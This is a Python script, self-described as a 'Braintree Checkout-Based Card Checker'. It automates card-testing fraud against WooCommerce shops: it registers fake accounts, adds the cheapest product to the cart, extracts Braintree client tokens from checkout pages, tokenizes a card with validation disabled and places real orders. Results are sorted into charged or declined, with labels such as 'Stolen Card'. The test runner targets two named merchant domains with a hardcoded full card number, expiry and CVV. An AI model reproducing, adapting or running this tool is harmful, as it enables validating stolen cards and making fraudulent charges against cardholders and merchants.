"""
CHARGE.py - Braintree Checkout-Based Card Checker
Automatically fetches products and completes checkout process.

Flow:
1. Register/Login account
2. Browse shop and fetch cheapest product
3. Add product to cart
4. Go to checkout
5. Fill billing details
6. Extract Braintree token from checkout
7. Tokenize card with Braintree
8. Complete payment (place order)
"""

import asyncio
import base64
import json
import logging
import random
import re
import time
import uuid
from dataclasses import dataclass
from enum import Enum
from typing import Tuple, Optional, Dict, List

import aiohttp

# ============================================================================
# LOGGING
# ============================================================================

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%H:%M:%S"
)
logger = logging.getLogger(__name__)

# ============================================================================
# ENUMS & DATACLASSES
# ============================================================================

class Status(str, Enum):
    CHARGED = "Charged"
    DECLINED = "Declined"
    ERROR = "Error"

@dataclass
class Card:
    number: str
    month: str
    year: str
    cvv: str
    
    def masked(self) -> str:
        return f"{self.number[:6]}******{self.number[-4:]}"

@dataclass
class Product:
    id: str
    name: str
    price: float
    url: str

@dataclass
class Result:
    status: Status
    message: str
    amount: Optional[float] = None
    product: Optional[str] = None
    method: str = "CHARGE"

# ============================================================================
# CONFIG
# ============================================================================

HEADERS = {
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'accept-language': 'en-US,en;q=0.9',
}

BT_HEADERS = {
    'content-type': 'application/json',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    'braintree-version': '2018-05-10',
    'accept': '*/*',
    'origin': 'https://assets.braintreegateway.com',
}

SUCCESS_MSGS = [
    'thank you', 'order received', 'order complete', 'payment successful',
    'order has been received', 'purchase successful', 'payment complete'
]

DECLINE_MSGS = {
    'insufficient funds': 'Low Fund',
    'card declined': 'Declined',
    'invalid cvv': 'Invalid CVV',
    'do not honor': 'Do Not Honor',
    'stolen': 'Stolen Card',
    'expired': 'Expired',
}

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

def extract(pattern: str, text: str, flags=0) -> Optional[str]:
    """Extract using regex."""
    match = re.search(pattern, text, flags)
    if match:
        for i in range(1, len(match.groups()) + 1):
            if match.group(i):
                return match.group(i)
    return None

def extract_all(pattern: str, text: str, flags=0) -> List[str]:
    """Extract all matches."""
    return re.findall(pattern, text, flags)

async def fetch(session: aiohttp.ClientSession, url: str, headers: dict) -> str:
    """Fetch page."""
    async with session.get(url, headers=headers, allow_redirects=True) as resp:
        if resp.status not in [200, 302]:
            raise Exception(f"HTTP {resp.status}")
        return await resp.text()

async def post(session: aiohttp.ClientSession, url: str, data: str, headers: dict) -> Tuple[str, str]:
    """POST data and return response text and final URL."""
    async with session.post(url, headers=headers, data=data, allow_redirects=True) as resp:
        return await resp.text(), str(resp.url)

# ============================================================================
# ACCOUNT MANAGEMENT
# ============================================================================

async def register_account(session: aiohttp.ClientSession, url: str) -> Tuple[bool, str]:
    """Register new account."""
    try:
        logger.info(f"Registering on {url}")
        
        # Get registration page
        page = await fetch(session, f'https://{url}/my-account/', HEADERS)
        
        # Extract nonce
        nonce = extract(r'name=["\']woocommerce-register-nonce["\'][^>]*value=["\']([^"\']+)', page)
        if not nonce:
            nonce = extract(r'"woocommerce-register-nonce"\s*:\s*"([^"]+)"', page)
        if not nonce:
            return False, "No registration nonce"
        
        # Register
        email = f"user{random.randint(10000, 99999)}@gmail.com"
        data = f"email={email}&woocommerce-register-nonce={nonce}&_wp_http_referer=%2Fmy-account%2F&register=Register"
        
        headers = HEADERS.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['referer'] = f'https://{url}/my-account/'
        
        resp, _ = await post(session, f'https://{url}/my-account/', data, headers)
        
        if 'logout' in resp.lower() or 'dashboard' in resp.lower():
            logger.info(f"✓ Registered: {email}")
            return True, email
        
        return False, "Registration failed"
        
    except Exception as e:
        return False, str(e)

# ============================================================================
# PRODUCT DISCOVERY
# ============================================================================

async def find_products(session: aiohttp.ClientSession, url: str) -> List[Product]:
    """Find products in shop."""
    try:
        logger.info("Finding products...")
        products = []
        
        # Try common shop URLs
        shop_urls = [
            f'https://{url}/shop/',
            f'https://{url}/products/',
            f'https://{url}/store/',
        ]
        
        page = None
        for shop_url in shop_urls:
            try:
                page = await fetch(session, shop_url, HEADERS)
                if 'product' in page.lower():
                    break
            except:
                continue
        
        if not page:
            return []
        
        # Extract product links
        # Pattern 1: Direct product links
        product_links = extract_all(r'href=["\']([^"\']*product[^"\']*?)["\']', page, re.IGNORECASE)
        
        # Pattern 2: Add to cart links with product ID
        product_ids = extract_all(r'data-product_id=["\'](\d+)["\']', page)
        
        for link in product_links[:10]:  # Limit to first 10
            if 'add-to-cart' not in link and 'cart' not in link:
                # Try to extract product info
                try:
                    if not link.startswith('http'):
                        link = f"https://{url}{link if link.startswith('/') else '/' + link}"
                    
                    prod_page = await fetch(session, link, HEADERS)
                    
                    # Extract product name
                    name = extract(r'<h1[^>]*class=["\'][^"\']*product[^"\']*title[^"\']*["\'][^>]*>([^<]+)', prod_page, re.IGNORECASE)
                    if not name:
                        name = extract(r'<title>([^<|]+)', prod_page)
                    
                    # Extract price
                    price_text = extract(r'<span[^>]*class=["\'][^"\']*woocommerce-Price-amount[^"\']*["\'][^>]*>.*?(\d+\.?\d*)</span>', prod_page, re.IGNORECASE | re.DOTALL)
                    if not price_text:
                        price_text = extract(r'[\$£€](\d+\.?\d*)', prod_page)
                    
                    price = float(price_text) if price_text else 0.0
                    
                    # Extract product ID
                    prod_id = extract(r'data-product_id=["\'](\d+)["\']', prod_page)
                    if not prod_id:
                        prod_id = extract(r'product[_-](\d+)', link)
                    
                    if prod_id and name:
                        products.append(Product(
                            id=prod_id,
                            name=name.strip()[:50],
                            price=price,
                            url=link
                        ))
                        logger.info(f"  Found: {name.strip()[:40]} - ${price}")
                    
                    await asyncio.sleep(0.5)
                    
                except Exception as e:
                    logger.debug(f"Product parse error: {e}")
                    continue
        
        return products
        
    except Exception as e:
        logger.error(f"Product discovery failed: {e}")
        return []

async def get_cheapest_product(session: aiohttp.ClientSession, url: str) -> Optional[Product]:
    """Get cheapest available product."""
    products = await find_products(session, url)
    
    if not products:
        logger.warning("No products found")
        return None
    
    # Filter products with price > 0
    valid_products = [p for p in products if p.price > 0]
    
    if valid_products:
        cheapest = min(valid_products, key=lambda x: x.price)
        logger.info(f"✓ Selected: {cheapest.name} - ${cheapest.price}")
        return cheapest
    
    # If no prices found, return first product
    if products:
        logger.info(f"✓ Selected: {products[0].name}")
        return products[0]
    
    return None

# ============================================================================
# CART & CHECKOUT
# ============================================================================

async def add_to_cart(session: aiohttp.ClientSession, url: str, product: Product) -> bool:
    """Add product to cart."""
    try:
        logger.info(f"Adding to cart: {product.name}")
        
        # Try direct add to cart
        cart_url = f'https://{url}/?add-to-cart={product.id}'
        headers = HEADERS.copy()
        headers['referer'] = product.url
        
        await fetch(session, cart_url, headers)
        await asyncio.sleep(1)
        
        # Verify cart
        cart_page = await fetch(session, f'https://{url}/cart/', HEADERS)
        if 'cart-empty' not in cart_page.lower() or product.id in cart_page:
            logger.info("✓ Added to cart")
            return True
        
        return False
        
    except Exception as e:
        logger.error(f"Add to cart failed: {e}")
        return False

async def fill_billing_details(session: aiohttp.ClientSession, url: str) -> bool:
    """Pre-fill billing details if needed."""
    try:
        # Visit edit billing page
        headers = HEADERS.copy()
        headers['referer'] = f'https://{url}/my-account/'
        
        page = await fetch(session, f'https://{url}/my-account/edit-address/billing/', headers)
        
        nonce = extract(r'name=["\']woocommerce-edit-address-nonce["\'][^>]*value=["\']([^"\']+)', page)
        if not nonce:
            return True  # Skip if not available
        
        data = (
            f"billing_first_name=John&"
            f"billing_last_name=Doe&"
            f"billing_company=TestCo&"
            f"billing_country=US&"
            f"billing_address_1=123+Main+St&"
            f"billing_address_2=&"
            f"billing_city=New+York&"
            f"billing_state=NY&"
            f"billing_postcode=10001&"
            f"billing_phone=12125551234&"
            f"billing_email=test{random.randint(1000,9999)}@gmail.com&"
            f"save_address=Save+address&"
            f"woocommerce-edit-address-nonce={nonce}&"
            f"_wp_http_referer=%2Fmy-account%2Fedit-address%2Fbilling%2F&"
            f"action=edit_address"
        )
        
        headers = HEADERS.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['referer'] = f'https://{url}/my-account/edit-address/billing/'
        
        await post(session, f'https://{url}/my-account/edit-address/billing/', data, headers)
        logger.info("✓ Billing filled")
        return True
        
    except:
        return True  # Non-critical

# ============================================================================
# BRAINTREE TOKEN EXTRACTION
# ============================================================================

async def get_checkout_braintree_token(session: aiohttp.ClientSession, url: str) -> Optional[str]:
    """Extract Braintree token from checkout page."""
    try:
        logger.info("Getting Braintree token from checkout...")
        
        headers = HEADERS.copy()
        headers['referer'] = f'https://{url}/cart/'
        
        page = await fetch(session, f'https://{url}/checkout/', headers)
        
        # Method 1: Embedded token
        token = extract(r'wc_braintree_client_token["\']?\s*[=:]\s*["\']?([A-Za-z0-9+/=]{100,})', page, re.IGNORECASE)
        if token:
            try:
                decoded = base64.b64decode(token).decode('utf-8')
                auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                if auth:
                    logger.info("✓ Token from checkout HTML")
                    return auth
            except:
                pass
        
        # Method 2: AJAX on checkout page
        cnonce = extract(r'"client_token_nonce"\s*:\s*"([^"]+)"', page, re.IGNORECASE)
        if cnonce:
            ajax_data = f"action=wc_braintree_credit_card_get_client_token&nonce={cnonce}"
            ajax_headers = HEADERS.copy()
            ajax_headers['content-type'] = 'application/x-www-form-urlencoded'
            ajax_headers['x-requested-with'] = 'XMLHttpRequest'
            ajax_headers['referer'] = f'https://{url}/checkout/'
            
            try:
                ajax_resp, _ = await post(session, f'https://{url}/wp-admin/admin-ajax.php', ajax_data, ajax_headers)
                data_token = extract(r'"data"\s*:\s*"([^"]+)"', ajax_resp)
                if data_token:
                    decoded = base64.b64decode(data_token).decode('utf-8')
                    auth = extract(r'"authorizationFingerprint"\s*:\s*"([^"]+)"', decoded)
                    if auth:
                        logger.info("✓ Token from checkout AJAX")
                        return auth
            except:
                pass
        
        return None
        
    except Exception as e:
        logger.error(f"Checkout token extraction failed: {e}")
        return None

# ============================================================================
# CARD TOKENIZATION
# ============================================================================

async def tokenize_card(session: aiohttp.ClientSession, card: Card, auth_token: str) -> Optional[Tuple[str, str]]:
    """Tokenize card with Braintree."""
    try:
        logger.info(f"Tokenizing {card.masked()}")
        
        headers = BT_HEADERS.copy()
        headers['authorization'] = f'Bearer {auth_token}'
        
        payload = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': str(uuid.uuid4())
            },
            'query': '''
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                    tokenizeCreditCard(input: $input) {
                        token
                        creditCard { bin brandCode last4 }
                    }
                }
            ''',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': card.number,
                        'expirationMonth': card.month,
                        'expirationYear': card.year,
                        'cvv': card.cvv,
                        'cardholderName': 'John Doe',
                        'billingAddress': {'postalCode': '10001'}
                    },
                    'options': {'validate': False}
                }
            },
            'operationName': 'TokenizeCreditCard'
        }
        
        async with session.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload) as resp:
            if resp.status != 200:
                return None
            
            text = await resp.text()
            token = extract(r'"token"\s*:\s*"([^"]+)"', text)
            brand = extract(r'"brandCode"\s*:\s*"([^"]+)"', text) or 'master-card'
            
            if token:
                logger.info(f"✓ Card tokenized ({brand})")
                return token, brand
            
        return None
        
    except Exception as e:
        logger.error(f"Tokenization failed: {e}")
        return None

# ============================================================================
# CHECKOUT COMPLETION
# ============================================================================

async def complete_checkout(session: aiohttp.ClientSession, url: str, token: str, brand: str, amount: float) -> Result:
    """Complete checkout and place order."""
    try:
        logger.info("Completing checkout...")
        
        # Get checkout page for nonces
        headers = HEADERS.copy()
        headers['referer'] = f'https://{url}/cart/'
        page = await fetch(session, f'https://{url}/checkout/', headers)
        
        # Extract nonces
        checkout_nonce = extract(r'name=["\']woocommerce-process-checkout-nonce["\'][^>]*value=["\']([^"\']+)', page)
        if not checkout_nonce:
            checkout_nonce = extract(r'"woocommerce-process-checkout-nonce"\s*:\s*"([^"]+)"', page)
        
        if not checkout_nonce:
            return Result(Status.ERROR, "Checkout nonce not found")
        
        # Build checkout data
        data = (
            f"billing_first_name=John&"
            f"billing_last_name=Doe&"
            f"billing_company=TestCo&"
            f"billing_country=US&"
            f"billing_address_1=123+Main+St&"
            f"billing_address_2=&"
            f"billing_city=New+York&"
            f"billing_state=NY&"
            f"billing_postcode=10001&"
            f"billing_phone=12125551234&"
            f"billing_email=test{random.randint(1000,9999)}@gmail.com&"
            f"order_comments=&"
            f"payment_method=braintree_credit_card&"
            f"wc-braintree-credit-card-card-type={brand}&"
            f"wc-braintree-credit-card-3d-secure-enabled=&"
            f"wc-braintree-credit-card-3d-secure-verified=&"
            f"wc-braintree-credit-card-3d-secure-order-total={amount}&"
            f"wc_braintree_credit_card_payment_nonce={token}&"
            f"wc_braintree_device_data=&"
            f"wc-braintree-credit-card-tokenize-payment-method=true&"
            f"woocommerce-process-checkout-nonce={checkout_nonce}&"
            f"_wp_http_referer=%2Fcheckout%2F"
        )
        
        headers = HEADERS.copy()
        headers['content-type'] = 'application/x-www-form-urlencoded'
        headers['referer'] = f'https://{url}/checkout/'
        
        resp, final_url = await post(session, f'https://{url}/?wc-ajax=checkout', data, headers)
        resp_lower = resp.lower()
        
        # Check success
        for msg in SUCCESS_MSGS:
            if msg in resp_lower or 'order-received' in final_url:
                logger.info(f"✓ CHARGED ${amount}")
                return Result(Status.CHARGED, f"Charged ${amount}", amount)
        
        # Check decline
        for key, val in DECLINE_MSGS.items():
            if key in resp_lower:
                logger.warning(f"✗ {val}")
                return Result(Status.DECLINED, val, amount)
        
        # Check for error messages
        error = extract(r'"message"\s*:\s*"([^"]+)"', resp)
        if error:
            return Result(Status.DECLINED, error[:100], amount)
        
        return Result(Status.ERROR, "Unknown checkout response")
        
    except Exception as e:
        logger.error(f"Checkout failed: {e}")
        return Result(Status.ERROR, str(e)[:100])

# ============================================================================
# MAIN CHARGE FLOW
# ============================================================================

async def charge_check(url: str, card: Card) -> Result:
    """Complete CHARGE check flow."""
    try:
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=20)
        timeout = aiohttp.ClientTimeout(total=120)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout, cookie_jar=aiohttp.CookieJar()) as session:
            
            # Step 1: Register
            success, msg = await register_account(session, url)
            if not success:
                return Result(Status.ERROR, f"Registration failed: {msg}")
            
            await asyncio.sleep(1)
            
            # Step 2: Fill billing (optional)
            await fill_billing_details(session, url)
            await asyncio.sleep(1)
            
            # Step 3: Find and select product
            product = await get_cheapest_product(session, url)
            if not product:
                return Result(Status.ERROR, "No products found")
            
            await asyncio.sleep(1)
            
            # Step 4: Add to cart
            if not await add_to_cart(session, url, product):
                return Result(Status.ERROR, "Failed to add to cart")
            
            await asyncio.sleep(1)
            
            # Step 5: Get Braintree token from checkout
            auth_token = await get_checkout_braintree_token(session, url)
            if not auth_token:
                return Result(Status.ERROR, "Could not get Braintree token from checkout")
            
            await asyncio.sleep(1)
            
            # Step 6: Tokenize card
            result = await tokenize_card(session, card, auth_token)
            if not result:
                return Result(Status.ERROR, "Card tokenization failed")
            
            payment_token, brand = result
            await asyncio.sleep(1)
            
            # Step 7: Complete checkout
            charge_result = await complete_checkout(session, url, payment_token, brand, product.price)
            charge_result.product = product.name
            return charge_result
        
    except Exception as e:
        logger.exception("CHARGE check failed")
        return Result(Status.ERROR, str(e)[:100])

# ============================================================================
# TEST RUNNER
# ============================================================================

async def test_charge():
    """Test CHARGE on multiple sites."""
    print("=" * 80)
    print("CHARGE.py - Braintree Checkout-Based Card Checker")
    print("=" * 80)
    
    SITES = [
        'djcity.com.au',
        'strymon.net',
    ]
    
    CARD = Card('5403850087142766', '11', '2028', '427')
    print(f"\nCard: {CARD.masked()} | {CARD.month}/{CARD.year}")
    print(f"Testing {len(SITES)} sites\n")
    
    results = []
    for i, site in enumerate(SITES, 1):
        print(f"[{i}/{len(SITES)}] {site}")
        result = await charge_check(site, CARD)
        results.append({'site': site, 'result': result})
        
        if result.product:
            print(f"  Product: {result.product}")
        if result.amount:
            print(f"  Amount: ${result.amount}")
        print(f"  └─ {result.status.value}: {result.message}\n")
        
        await asyncio.sleep(3)
    
    # Summary
    print("=" * 80)
    print("SUMMARY")
    print("=" * 80)
    charged = [r for r in results if r['result'].status == Status.CHARGED]
    declined = [r for r in results if r['result'].status == Status.DECLINED]
    errors = [r for r in results if r['result'].status == Status.ERROR]
    
    print(f"✓ Charged: {len(charged)}")
    print(f"✗ Declined: {len(declined)}")
    print(f"⚠ Errors: {len(errors)}")
    
    if charged:
        total = sum(r['result'].amount for r in charged if r['result'].amount)
        print(f"\nTotal Charged: ${total:.2f}")

if __name__ == "__main__":
    asyncio.run(test_charge())
